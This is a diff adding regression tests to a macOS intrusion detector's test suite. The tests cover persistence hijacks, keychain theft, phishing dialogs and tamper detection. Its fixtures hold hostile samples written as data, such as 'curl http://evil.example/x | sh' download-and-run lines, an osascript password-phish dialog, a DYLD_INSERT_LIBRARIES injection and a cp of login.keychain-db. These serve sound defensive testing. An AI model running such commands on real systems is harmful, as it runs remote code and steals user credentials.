@@ -172,7 +172,7 @@ class TestHostileArgsSeverity(Sandbox):
     def test_oracle_is_discriminating(self):
         # Mutation check: if _hostile_args is neutered, the HIGH assertion flips.
         saved = aegis._hostile_args
-        aegis._hostile_args = lambda args: False
+        aegis._hostile_args = lambda args, program=None: False
         try:
             sev = self._sev(["/bin/bash", "-c", "curl http://evil | sh"])
             self.assertEqual(sev, "LOW")  # proves the test depends on the mechanism
@@ -1845,6 +1845,404 @@ class TestInstaller(unittest.TestCase):
         r = subprocess.run(["bash", os.path.join(self.repo, "install.sh"), "abc"],
                            env=env, capture_output=True, text=True)
         self.assertNotEqual(r.returncode, 0)
+
+
+# =========================================================================== #
+# SPAR PROOFS — promoted from .spar/proofs/round-{1..4}/. Each class pins one
+# adversarial finding: it keeps the proof's discriminating CONTROL (a passing
+# sanity case) AND the now-fixed BUG case, so it would FAIL against pre-fix code
+# and PASS against current code. Fully sandboxed like every class above.
+# =========================================================================== #
+
+
+# --------------------------------------------------------------------------- #
+# R1 — is_risky_location() covers /opt/homebrew (Apple-Silicon Homebrew prefix),
+# mirroring /usr/local; an ad-hoc process there is flagged by check_processes.
+# --------------------------------------------------------------------------- #
+class TestOptHomebrewRisky(Sandbox):
+    def test_usr_local_is_risky_control(self):
+        # Control: the Intel Homebrew prefix is risky (proves the intent).
+        self.assertTrue(aegis.is_risky_location("/usr/local/bin/evil"))
+
+    def test_opt_homebrew_is_risky(self):
+        self.assertTrue(aegis.is_risky_location("/opt/homebrew/bin/evil"),
+                        "the Apple-Silicon Homebrew prefix must be risky too")
+
+    def _procs(self, procs):
+        saved_run, saved_cls = aegis.run, aegis.classify_signature
+        aegis.run = lambda cmd, timeout=15: (
+            ("\n".join(procs) + "\n", "", 0)
+            if cmd[:2] == ["ps", "-axo"] else ("", "", 0))
+        aegis.classify_signature = lambda p: {"trust": "adhoc", "team": None,
+                                              "authority": None}
+        aegis._sigcache = {}
+        try:
+            # base setUp stubs check_processes to []; exercise the REAL one.
+            return self._saved["check_processes"]()
+        finally:
+            aegis.run, aegis.classify_signature = saved_run, saved_cls
+
+    def test_usr_local_process_flagged_control(self):
+        fs = self._procs(["1234 /usr/local/bin/evil"])
+        self.assertTrue(any(f.get("path") == "/usr/local/bin/evil" for f in fs))
+
+    def test_opt_homebrew_process_flagged(self):
+        fs = self._procs(["1235 /opt/homebrew/bin/evil"])
+        self.assertTrue(any(f.get("path") == "/opt/homebrew/bin/evil" for f in fs),
+                        "an ad-hoc process in /opt/homebrew must be flagged")
+
+
+# --------------------------------------------------------------------------- #
+# R1 — check_behavior() flags a same-user osascript password-phish whose comm
+# (executable path) contains a space (split(None, 3) comm-shear fix).
+# --------------------------------------------------------------------------- #
+class TestBehaviorCommSpace(Sandbox):
+    PHISH = ('osascript -e display dialog "System update needs your password" '
+             'default answer "" with hidden answer')
+
+    def _run_with_ps(self, ps_rows):
+        real = self._saved["check_behavior"]
+        saved_run = aegis.run
+
+        def fake_run(cmd, timeout=15):
+            if cmd[:2] == ["ps", "-axo"]:
+                return ("\n".join(ps_rows) + "\n", "", 0)
+            return saved_run(cmd, timeout)
+        aegis.run = fake_run
+        try:
+            return real()
+        finally:
+            aegis.run = saved_run
+
+    def test_space_free_path_is_critical_control(self):
+        uid = str(os.getuid())
+        fs = self._run_with_ps(
+            ["  888 %s /usr/bin/osascript %s" % (uid, self.PHISH)])
+        self.assertTrue(any(f["category"] == "behavior"
+                            and f["severity"] == "CRITICAL" for f in fs), fs)
+
+    def test_spaced_exec_path_still_flagged(self):
+        # byte-identical hostile argv, but the executable path has a space
+        # (attacker copied osascript to "/tmp/Sys Update").
+        uid = str(os.getuid())
+        fs = self._run_with_ps(
+            ['  889 %s /tmp/Sys Update /tmp/Sys Update %s' % (uid, self.PHISH)])
+        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
+
+
+# --------------------------------------------------------------------------- #
+# R1 — diff_btm() flags an IN-PLACE BTM hijack (same identifier, Team ID
+# stripped, target swapped to an unsigned /private/tmp path) via changed_fn.
+# --------------------------------------------------------------------------- #
+class TestBtmChangedItem(Sandbox):
+    IDENT = "com.foo.updater"
+
+    def _prior(self):
+        return {self.IDENT: {"name": "Foo Updater", "team": "ABCDE12345",
+                             "type": "legacy agent (0x10008)",
+                             "url": "file:///Applications/Foo.app/Contents/Foo"}}
+
+    def _malicious(self):
+        return {self.IDENT: {"name": "Foo Updater", "team": None,
+                             "type": "legacy agent (0x10008)",
+                             "url": "file:///private/tmp/evil"}}
+
+    def test_malicious_as_new_item_is_high_control(self):
+        fs = aegis.diff_btm({}, self._malicious())
+        self.assertTrue(fs and fs[0]["severity"] == "HIGH", fs)
+
+    def test_in_place_hijack_flagged(self):
+        fs = aegis.diff_btm(self._prior(), self._malicious())
+        self.assertTrue(fs, "in-place hijack of a trusted BTM item must be flagged")
+
+
+# --------------------------------------------------------------------------- #
+# R2 — check_persistence() flags an in-place DYLD_INSERT_LIBRARIES env added to
+# an already-baselined trusted plist (env/args diff + _persistence_severity).
+# --------------------------------------------------------------------------- #
+class TestPersistenceEnvDiff(Sandbox):
+    PLIST = "/Users/victim/Library/LaunchAgents/com.benign.updater.plist"
+
+    def _base(self):
+        return {"label": "com.benign.updater",
+                "program": "/opt/homebrew/bin/updater",
+                "args": ["/opt/homebrew/bin/updater"], "sha256": "a" * 64,
+                "trust": "developer-id", "run_at_load": True,
+                "authority": "Developer ID Application: Benign Corp (TEAM123456)",
+                "env": None}
+
+    def test_mutated_record_scored_high_or_critical_control(self):
+        mutated = dict(self._base(),
+                       env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"})
+        self.assertIn(aegis._persistence_severity(mutated), ("CRITICAL", "HIGH"))
+
+    def test_program_change_detected_control(self):
+        changed = dict(self._base(), program="/tmp/evil", sha256="b" * 64)
+        self.assertEqual(
+            len(aegis.check_persistence({self.PLIST: self._base()},
+                                        {self.PLIST: changed})), 1)
+
+    def test_in_place_env_injection_flagged(self):
+        mutated = dict(self._base(),
+                       env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"})
+        fs = aegis.check_persistence({self.PLIST: self._base()},
+                                     {self.PLIST: mutated})
+        self.assertGreaterEqual(len(fs), 1,
+                                "in-place env injection on a baselined plist "
+                                "must produce a finding")
+
+    def test_program_swap_floors_at_high_even_when_replacement_is_benign_signed(self):
+        # Invariant (mirrors selftest.py): a program/hash change to a baselined
+        # item is inherently serious even if the new binary is still validly
+        # signed in a trusted location — the change ITSELF is the signal, so it
+        # must never score below HIGH. Severity-by-record may only escalate it.
+        swapped = dict(self._base(),
+                       program="/Applications/Foo.app/Contents/MacOS/Foo2",
+                       sha256="c" * 64)  # still developer-id, still trusted path
+        fs = aegis.check_persistence({self.PLIST: self._base()},
+                                     {self.PLIST: swapped})
+        self.assertEqual(len(fs), 1)
+        self.assertIn(fs[0]["severity"], ("HIGH", "CRITICAL"),
+                      "a program/hash change must floor at HIGH")
+
+    def test_env_injection_escalates_above_the_high_floor(self):
+        # The floor is a floor, not a cap: an env-injection (code-injection
+        # persistence) on the same benign-signed item still reaches CRITICAL.
+        mutated = dict(self._base(),
+                       program="/tmp/evil", sha256="d" * 64,
+                       env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"})
+        fs = aegis.check_persistence({self.PLIST: self._base()},
+                                     {self.PLIST: mutated})
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+
+
+# --------------------------------------------------------------------------- #
+# R2 — check_behavior() flags a same-user `cp login.keychain-db` theft (cp is in
+# the pre-filter watch set); the theft scores keychain-db-access HIGH.
+# --------------------------------------------------------------------------- #
+class TestBehaviorKeychainCp(Sandbox):
+    def _run(self, out):
+        real = self._saved["check_behavior"]
+        saved_run = aegis.run
+        aegis.run = lambda cmd, timeout=15: (out, "", 0)
+        try:
+            return real()
+        finally:
+            aegis.run = saved_run
+
+    def test_argv_signals_scores_keychain_cp_high_control(self):
+        sig = dict(aegis._argv_signals(
+            "/bin/cp cp /Users/victim/Library/Keychains/login.keychain-db /tmp/k"))
+        self.assertEqual(sig.get("keychain-db-access"), "HIGH")
+
+    def test_security_binary_theft_flagged_control(self):
+        uid = str(os.getuid())
+        line = ("99998 %s /usr/bin/security security find-generic-password -w "
+                "login.keychain-db\n" % uid)
+        self.assertTrue(self._run(line))
+
+    def test_cp_keychain_theft_flagged(self):
+        uid = str(os.getuid())
+        line = ("99999 %s /bin/cp cp /Users/victim/Library/Keychains/"
+                "login.keychain-db /tmp/k\n" % uid)
+        self.assertTrue(self._run(line),
+                        "cp-based keychain theft must produce a behavioral finding")
+
+
+# --------------------------------------------------------------------------- #
+# R2 — snapshot_extra_persistence() captures a script two levels deep (the real
+# /etc/periodic/<daily>/ and /Library/StartupItems/<Item>/ layout) via a bounded
+# os.walk, and still captures a flat one-level file.
+# --------------------------------------------------------------------------- #
+class TestExtraPersistWalkDepth(Sandbox):
+    def test_flat_and_nested_both_captured(self):
+        root = os.path.join(self.tmp, "extra")
+        os.makedirs(os.path.join(root, "daily"))
+        flat = os.path.join(root, "flat.conf")
+        with open(flat, "w") as f:
+            f.write("auth sufficient pam_permit.so\n")
+        nested = os.path.join(root, "daily", "600.evil")
+        with open(nested, "w") as f:
+            f.write("#!/bin/sh\ncurl http://evil.example/x | sh\n")
+        aegis.EXTRA_PERSIST_FILES = []
+        aegis.EXTRA_PERSIST_DIRS = [root]
+        snap = aegis.snapshot_extra_persistence()
+        self.assertIn(flat, snap, "flat one-level file must be captured (control)")
+        self.assertIn(nested, snap,
+                      "nested two-level persistence script must be captured")
+
+
+# --------------------------------------------------------------------------- #
+# R3 — _parse_btm() captures the `URL:` line when it appears AFTER `Identifier:`
+# (real sfltool dumpbtm order), so a no-team item in a writable path scores HIGH
+# end-to-end (snapshot text -> _parse_btm -> diff_btm).
+# --------------------------------------------------------------------------- #
+class TestParseBtmUrlAfterIdentifier(Sandbox):
+    BTM_TEXT = ("========================\n"
+                " Records for UID 501\n"
+                "========================\n"
+                " Items:\n\n"
+                " #1:\n"
+                "                 UUID: BBBB-2\n"
+                "                 Name: Evil Helper\n"
+                "                 Type: agent (0x8)\n"
+                "           Identifier: com.evil.helper\n"
+                "                  URL: file:///Users/Shared/evil.plist\n")
+
+    def test_direct_url_scores_high_control(self):
+        rec = {"name": "Evil Helper", "team": None, "type": "agent",
+               "url": "file:///Users/Shared/evil.plist"}
+        fs = aegis.diff_btm({}, {"com.evil.helper": rec})
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "HIGH")
+
+    def test_parsed_url_preserved_and_pipeline_high(self):
+        parsed = aegis._parse_btm(self.BTM_TEXT)
+        self.assertEqual(parsed["com.evil.helper"]["url"],
+                         "file:///Users/Shared/evil.plist",
+                         "_parse_btm must not drop a URL that follows Identifier")
+        fs = aegis.diff_btm({}, parsed)
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "HIGH")
+
+
+# --------------------------------------------------------------------------- #
+# R3 — a launchd job with a DECOY ProgramArguments[0] but Program=/bin/bash on an
+# inline `-c` payload scores HIGH: interpreter identity comes from the resolved
+# Program key, not the attacker-chosen argv0.
+# --------------------------------------------------------------------------- #
+class TestProgramArgv0Decoy(Sandbox):
+    PAYLOAD = "echo hi > $HOME/.x"
+
+    def _severities(self):
+        self.write_plist("decoy.plist",
+                         ["com.apple.softwareupdate", "-c", self.PAYLOAD],
+                         program="/bin/bash")
+        self.write_plist("honest.plist",
+                         ["/bin/bash", "-c", self.PAYLOAD], program="/bin/bash")
+        saved_cls = aegis.classify_signature
+        aegis.classify_signature = lambda p: {"trust": "apple", "team": None,
+                                              "authority": "Software Signing"}
+        try:
+            snap = aegis.snapshot_persistence()
+        finally:
+            aegis.classify_signature = saved_cls
+        decoy = snap[os.path.join(self.pers, "decoy.plist")]
+        honest = snap[os.path.join(self.pers, "honest.plist")]
+        # aegis resolves the REAL interpreter from Program for BOTH.
+        self.assertEqual(decoy["program"], "/bin/bash")
+        self.assertEqual(honest["program"], "/bin/bash")
+        return (aegis._persistence_severity(decoy),
+                aegis._persistence_severity(honest))
+
+    def test_honest_argv0_is_high_control(self):
+        _decoy, honest = self._severities()
+        self.assertEqual(honest, "HIGH")
+
+    def test_decoy_argv0_is_high(self):
+        decoy, _honest = self._severities()
+        self.assertEqual(decoy, "HIGH",
+                         "a decoy argv0 must not downgrade a signed-interpreter "
+                         "inline-exec job below HIGH")
+
+
+# --------------------------------------------------------------------------- #
+# R3 — `~/./.agent` (a no-op `/./` normpath dodge) scores HIGH like `~/.agent`:
+# the hidden home-root script signal normalizes the path before comparing.
+# --------------------------------------------------------------------------- #
+class TestHiddenHomeNormpathDodge(Sandbox):
+    def _rec(self, args):
+        return {"label": "com.user.helper", "program": "/bin/bash",
+                "trust": "apple", "authority": "Software Signing", "args": args,
+                "env": None, "run_at_load": True, "sha256": "deadbeef"}
+
+    def test_clean_hidden_home_script_is_high_control(self):
+        sev = aegis._persistence_severity(
+            self._rec(["/bin/bash", aegis.HOME + "/.agent"]))
+        self.assertEqual(sev, "HIGH")
+
+    def test_normpath_dodge_is_high(self):
+        clean = aegis.HOME + "/.agent"
+        dodge = aegis.HOME + "/./.agent"          # identical file to the kernel
+        self.assertEqual(os.path.normpath(clean), os.path.normpath(dodge))
+        sev = aegis._persistence_severity(self._rec(["/bin/bash", dodge]))
+        self.assertEqual(sev, "HIGH",
+                         "a `/./` path component must not dodge the hidden-home "
+                         "signal")
+
+
+# --------------------------------------------------------------------------- #
+# R4 — check_xprotect() skips a log record whose eventMessage is valid JSON but
+# NOT an object (array/scalar) instead of raising — a single malformed line must
+# not abort the whole scan.
+# --------------------------------------------------------------------------- #
+class TestXprotectNonDictEventMessage(Sandbox):
+    def _harvest(self, ndjson_lines):
+        aegis.XPROTECT_BUNDLES = []   # freshness off; exercise the parser only
+        real = self._saved["check_xprotect"]
+        saved_run = aegis.run
+
+        def fake_run(cmd, timeout=45):
+            if cmd[:2] == ["log", "show"]:
+                return "\n".join(ndjson_lines), "", 0
+            return "", "", 0
+        aegis.run = fake_run
+        try:
+            return real()
+        finally:
+            aegis.run = saved_run
+
+    def _event(self, event_message_raw):
+        return json.dumps({
+            "processImagePath": "/Library/Apple/System/Library/CoreServices/"
+                                "XProtect.app/Contents/MacOS/XProtectRemediatorFoo",
+            "eventMessage": event_message_raw,
+            "timestamp": "2026-07-17 12:00:00"})
+
+    def test_clean_event_returns_empty_control(self):
+        clean = json.dumps({"status_message": "NoThreatDetected", "caused_by": []})
+        self.assertEqual(self._harvest([self._event(clean)]), [])
+
+    def test_non_dict_event_message_is_skipped_not_crashed(self):
+        # eventMessage = a valid JSON array; must be skipped, returning cleanly.
+        try:
+            result = self._harvest([self._event("[]")])
+        except Exception as e:  # noqa: BLE001 — a raise is the pre-fix bug
+            self.fail("check_xprotect raised on a non-dict eventMessage: %r" % e)
+        self.assertEqual(result, [])
+
+
+# --------------------------------------------------------------------------- #
+# R4 — check_self_protection() flags out-of-band DELETION of baseline.json (not
+# only modification): a recorded hash + vanished trust store is tampering.
+# --------------------------------------------------------------------------- #
+class TestSelfProtectionBaselineDeletion(Sandbox):
+    def _setup_recorded(self):
+        aegis.save_json(aegis.BASELINE,
+                        {"created": "t0", "persistence": {"/x": "clean"}})
+        recorded = aegis.sha256(aegis.BASELINE)
+        aegis.save_json(aegis.SELFSTATE,
+                        {"baseline_sha": recorded, "allowlist_sha": None})
+        return recorded
+
+    def _tamper_findings(self, fs):
+        return [f for f in fs
+                if f.get("fingerprint", "").startswith("self:baseline:tampered")]
+
+    def test_modification_flagged_control(self):
+        self._setup_recorded()
+        aegis.save_json(aegis.BASELINE,
+                        {"created": "t0", "persistence": {"/x": "ATTACKER"}})
+        self.assertTrue(self._tamper_findings(aegis.check_self_protection()),
+                        "out-of-band modification must be flagged (control)")
+
+    def test_deletion_flagged(self):
+        recorded = self._setup_recorded()
+        self.assertEqual(aegis.sha256(aegis.BASELINE), recorded)
+        os.remove(aegis.BASELINE)                 # attacker removes the trust store
+        self.assertTrue(self._tamper_findings(aegis.check_self_protection()),
+                        "out-of-band DELETION of baseline.json must be flagged")
 
 
 if __name__ == "__main__":
